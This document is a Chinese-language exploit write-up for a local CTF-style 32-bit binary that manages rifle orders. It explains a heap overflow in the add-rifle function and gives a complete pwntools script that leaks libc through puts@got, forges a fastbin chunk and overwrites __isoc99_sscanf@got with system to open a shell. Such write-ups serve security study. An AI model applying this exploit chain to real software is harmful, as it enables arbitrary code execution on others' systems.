# 漏洞利用文档

## 执行环境
基于反编译代码和exp分析，程序运行环境如下：
- **二进制类型**：32位ELF程序，使用动态链接
- **安全机制**：
  - No PIE：代码段和数据段地址固定（如0x804xxxx），便于地址预测
  - No RELRO：GOT表可写，允许GOT覆盖攻击
  - NX enabled：数据不可执行，防止shellcode执行
  - Stack Canary：栈保护启用，但堆漏洞利用不受影响
- **依赖库**：通过ldd命令可看到依赖libc，exp中使用LibcSearcher确定libc版本
- **运行需求**：Linux环境，需要相应的libc库，程序通过菜单交互管理步枪订单系统

## 漏洞成因
程序使用链表结构管理步枪对象，每个节点通过堆分配。关键结构体如下：
```c
struct rifle_node {
    char description[25];      // 偏移0-24：步枪描述
    char name[27];            // 偏移25-51：步枪名称  
    struct rifle_node *next;  // 偏移52-55：下一个节点指针
};
```
漏洞位于`sub_8048644`函数（添加步枪功能）：
- 使用`malloc(0x38)`分配56字节堆块
- 名称字段通过`fgets(dword_804A288 + 25, 56, stdin)`写入，从偏移25开始读取56字节
- 但用户数据区只有56字节，从偏移25写入56字节会溢出到偏移52处的next指针
- 攻击者可通过精心构造名称字段覆盖next指针，实现任意地址读/写

漏洞类型：**堆溢出**，通过覆盖链表节点的next指针控制程序执行流。

## 漏洞利用过程
利用过程通过精心构造的堆操作实现GOT覆盖和shell获取，关键步骤和内存变化如下：

| 步骤 | EXP操作 | 内存关键变化 | 利用目的 |
|------|---------|-------------|----------|
| 1 | `addRifle(b'0'*0x1b + p32(elf.got['puts']), b'15935728')` | 堆块0x8c88458的next指针从NULL覆盖为0x804a248(puts@got) | 准备libc地址泄露 |
| 2 | `leakLibc()` | 通过遍历链表读取puts@got值0xf7e1dcb0，计算libc_base=0xf7dbe000 | 获取libc基址和system地址 |
| 3 | `addRifles(0x3f)` | 执行63次添加/释放操作，填充fastbins，dword_804A2A4=0x41 | 准备堆布局用于fastbin攻击 |
| 4 | `addRifle(b'1'*0x1b + p32(0x804a2a8), b'15935728')` | 堆块next指针覆盖为0x804a2a8(消息缓冲区指针) | 重定向链表到可控区域 |
| 5 | `leaveMessage(p32(0)*9 + p32(0x81))` | 消息缓冲区0x804a2c0写入伪造chunk大小0x81 | 创建伪造fastbin chunk |
| 6 | `orderRifles()` | 释放所有堆块，链表头清空，伪造chunk进入fastbin | 触发堆管理器处理伪造chunk |
| 7 | `addRifle(b'15935728', p32(elf.got['__isoc99_sscanf']))` | 添加新堆块，准备GOT覆盖目标 | 设置GOT覆盖的目标地址 |
| 8 | `leaveMessage(p32(system))` | __isoc99_sscanf@got(0x804a258)从0xf7e1a4d0覆盖为system地址0xf7df8db0 | 实现GOT劫持 |
| 9 | `p.sendline(b'/bin/sh')` | 程序调用__isoc99_sscanf时实际执行system("/bin/sh") | 触发shell执行 |
| 10 | `p.interactive()` | 进程完全切换到/bin/dash，获得完整shell控制权 | 维持交互式访问 |

**堆布局演变**：
- 初始状态：空堆，链表头为NULL
- 步骤1后：单个堆块，next指针指向GOT
- 步骤3后：多个堆块在fastbins中，堆布局复杂化
- 步骤6后：所有堆块释放，但伪造chunk保留
- 最终状态：堆被重用，进程切换为shell

**全局变量变化**：
- `dword_804A288`(链表头)：NULL → 0x8c88458 → 0x804a2a8 → NULL
- `dword_804A2A8`(消息缓冲区)：0x804a2c0 → 0x804a258(GOT地址)
- `dword_804A2A4`(新建计数)：0 → 0x41 → 0x42
- `dword_804A2A0`(订单计数)：0 → 0x40

## Exploit
```python
from pwn import *
from LibcSearcher import *

# 设置调试环境
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample18')
p = process('./data/sample18')
libc = elf.libc  # 获取本地libc，实际可能使用LibcSearcher

def addRifle(name, desc):
    p.sendline(b'1')  # 选择菜单选项1：添加新步枪
    p.sendline(name)  # 输入步枪名称，精心构造用于堆溢出
    p.sendline(desc)  # 输入步枪描述

def leakLibc():
    p.sendline(b'2')  # 选择菜单选项2：显示步枪列表
    print(p.recvuntil(b'Description: '))
    print(p.recvuntil(b'Description: '))
    leak = p.recvline()  # 接收泄露的GOT地址
    puts = u32(leak[0:4])  # 解析puts函数实际地址
    libc_base = puts - libc.symbols['puts']  # 计算libc基址
    return libc_base

def orderRifles():
    p.sendline(b'3')  # 选择菜单选项3：提交订单，触发堆块释放

def leaveMessage(content):
    p.sendline(b'4')  # 选择菜单选项4：留下消息
    p.sendline(content)  # 写入消息内容到缓冲区

def addRifles(count):
    for i in range(count):
        # 批量添加并立即释放步枪，准备堆布局
        addRifle(b'1'*0x1b + p32(0x0), b'15935728')
        orderRifles()

# 步骤1：堆溢出覆盖next指针为puts@got地址，准备泄露
addRifle(b'0'*0x1b + p32(elf.got['puts']), b'15935728')

# 步骤2：通过链表遍历泄露libc地址，计算system地址
libc_base = leakLibc()
system = libc_base + libc.symbols['system']

# 步骤3：执行63次添加/释放操作，复杂化堆布局
addRifles(0x3f)

# 步骤4：再次堆溢出，覆盖next指针为消息缓冲区地址
addRifle(b'1'*0x1b + p32(0x804a2a8), b'15935728')

# 步骤5：在消息缓冲区伪造fastbin chunk大小
leaveMessage(p32(0)*9 + p32(0x81))

# 步骤6：释放所有堆块，使伪造chunk进入fastbin链
orderRifles()

# 步骤7：添加新步枪，准备GOT覆盖目标地址
addRifle(b'15935728', p32(elf.got['__isoc99_sscanf']))

# 步骤8：通过消息缓冲区覆盖GOT条目为system地址
leaveMessage(p32(system))

# 步骤9：触发system("/bin/sh")调用
p.sendline(b'/bin/sh')

# 步骤10：进入交互模式，获得shell控制
p.interactive()
```

**关键技术点**：
- 堆溢出精确覆盖next指针，控制链表遍历路径
- 通过GOT泄露绕过ASLR，计算libc基址
- 伪造fastbin chunk实现任意地址写
- GOT覆盖劫持函数调用，将__isoc99_sscanf替换为system
- 最终通过输入"/bin/sh"触发shell获取

该漏洞利用链成功利用了堆溢出漏洞，通过精心构造的堆操作实现了从内存泄露到代码执行的完整攻击路径。
